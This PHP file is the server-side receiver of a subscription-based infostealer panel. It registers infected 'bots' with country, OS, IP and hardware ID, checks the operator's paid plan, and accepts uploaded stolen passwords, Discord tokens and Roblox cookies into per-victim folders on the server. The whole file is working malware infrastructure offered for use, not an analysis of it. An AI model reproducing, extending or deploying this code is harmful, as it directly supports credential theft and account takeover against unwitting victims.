<?php
    include_once 'includes/functions.php';
    include_once __DIR__.'/../vendor/autoload.php';
    
    $rateLimitServer = [
        'host' => '127.0.0.1',
        'port' => 6379
    ];

    try{

        $adapter = new \PalePurple\RateLimit\Adapter\Predis(new \Predis\Client($rateLimitServer));
        $rateLimiter = new \PalePurple\RateLimit\RateLimit("uploadAPI", 100, 3600, $adapter);
    
        $id = realIP();
        $count = $rateLimiter->getAllowance($id);
        if ($rateLimiter->check($id)) {
            
            $time = time();
            $headers = apache_request_headers();
            // foreach ($headers as $header => $value) {
            //     $random = rand();
            //     $myfile = fopen("$header.txt", "w") or die("Unable to open file!");
            //     fwrite($myfile, "$header: $value");
            //     fclose($myfile);
            // }
            if(!isset($headers['Security']) || !isset($headers['pID']) || !isset($headers['botID']) || !isset($headers['folderName'])){
                die("Hi");
            }
            $hash = decrypt($headers['Security']);
            $pID = decrypt($headers['pID']);
            $botID = decrypt($headers['botID']);
            $activity = date('Y-m-d H:i:s');
            if(!isset($headers['robloxCookie'])){
                $country = decrypt($headers['country']);
                $botName = decrypt($headers['botName']);
                $os = decrypt($headers['os']);
                $ip = decrypt($headers['ip']);
                $hwid = hash('sha256', decrypt($headers['Hwid']));
            }
            $folderName = decrypt($headers['folderName']);
        
            $checkBan = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($pID)])->fetchColumn(0);
            $subEndDate = pdoQuery($db, "SELECT `subEndDate` FROM `users` WHERE `id`=?", [htmlspecialchars($pID)])->fetchColumn();
            $subscription = pdoQuery($db, "SELECT `subscription` FROM `users` WHERE `id`=?", [htmlspecialchars($pID)])->fetchColumn();
        
            for ($i=0; $i < 15; $i++) { 
        
                if (hash('sha256', '877692' . time() - $i) == $hash){
        
                    if ($checkBan == '0'){
        
                        if($subscription == "Monthly" || $subscription == "3Months" || $subscription == "Lifetime"){
                            $date = new DateTime($subEndDate);
                            $now = new DateTime();
                            
                            if($date > $now) {
        
                                if(!isset($headers['robloxCookie'])){
                                    $folder = "clients/" . $folderName;
                                    if (!file_exists($folder)) {
                                        mkdir($folder, 0777, true);
                                    }
                                    
                                    $PDOADD = $db -> prepare('INSERT INTO `bots` VALUES(:ID, :botID, :country, :botname, :os, :ip, :active, :last, :hwid, :folder, 0)');
                                    $PDOADD -> execute(array(':ID' => $pID, ':botID' => $botID, ':country' => $country, ':botname' => $botName, ':os' => $os, ':ip' => $ip, ':active' => 'false', ':last' => $activity, ':hwid' => $hwid, ':folder' => $folder));
        
                                    uploadFile($folder, 'passwords', 'passwords.txt');
                                    uploadFile($folder, 'discordToken', 'discordToken.txt');
                                }else{
                                    if (checkBOTID($botID) == 1){
                                        $PDOUpdate = $db -> prepare('UPDATE `bots` SET `lastactivity` = :last WHERE `botID` = :id');
                                        $PDOUpdate -> execute(array(':last' => $activity, ':id' => $botID));
        
                                        $folder = "clients/" . $folderName;
                                        uploadFile($folder, 'robloxCookie', 'robloxCookie.txt');
                                    }
                                }
                            }else{
                                //sub expired
                                $PDOUpdate = $db -> prepare('UPDATE `users` SET `subEndDate` = :sub WHERE `id` = :id');
                                $PDOUpdate -> execute(array(':sub' => '0', ':id' => htmlspecialchars($pID)));
                    
                                $PDOUpdate1 = $db -> prepare('UPDATE `users` SET `subscription` = :sub WHERE `id` = :id');
                                $PDOUpdate1 -> execute(array(':sub' => 'None', ':id' => htmlspecialchars($pID)));
                    
                                $PDOUpdate2 = $db -> prepare('UPDATE `users` SET `rank` = :rank WHERE `id` = :id');
                                $PDOUpdate2 -> execute(array(':rank' => 'User', ':id' => htmlspecialchars($pID)));
                            }
                        }
                    }else{
                        echo "Banned";
                    }
                    break;
                }else{
                    echo "Unauthorized";
                }
            }

        }else{
            http_response_code(429);
            exit(0);
        }
    }catch(Exception $e) {
        die("An error occured");
    }

    function checkHWID($hwid){
        global $db;
        $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
		$PDOCheckLogin = $db -> prepare("SELECT COUNT(*) FROM `bots` WHERE `hwid` = :hwid");
		$PDOCheckLogin -> execute(array(':hwid' => $hwid));
        $countLogin = $PDOCheckLogin -> fetchColumn(0);
        return $countLogin;
    }
    function uploadFile($folder, $inputName, $newName){
        if(isset($_FILES[$inputName]["name"])){

            $target_dir = $folder;
            $target_file = basename($_FILES[$inputName]["name"]);
            $imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
            $name = $_FILES[$inputName]["name"];
            $uploadReady = 1;
    
            // Check if file already exists
            if (file_exists("$target_dir/$name")) {
                $uploadReady = 0;
            }
            // Check file size
            if ($_FILES[$inputName]["size"] > 500000) {
                $uploadReady = 0;
            }
            // Allow certain file formats
            if($imageFileType != "txt" ) {
                $uploadReady = 0;
            }
            // Check if $uploadOk is set to 0 by an error
            if ($uploadReady == 1) {
        
                if (move_uploaded_file($_FILES[$inputName]["tmp_name"], "$target_dir/$newName")){
                    $encrypt=file_get_contents("$target_dir/$newName");
                    $encrypt=str_replace($encrypt, encrypt($encrypt), $encrypt);
                    file_put_contents("$target_dir/$newName", $encrypt);
                    echo "The file ". basename( $_FILES[$inputName]["name"]). " has been uploaded.";
                } else {
                    echo "Sorry, there was an error uploading your file.";
                }
            }
        }
    }
    ?>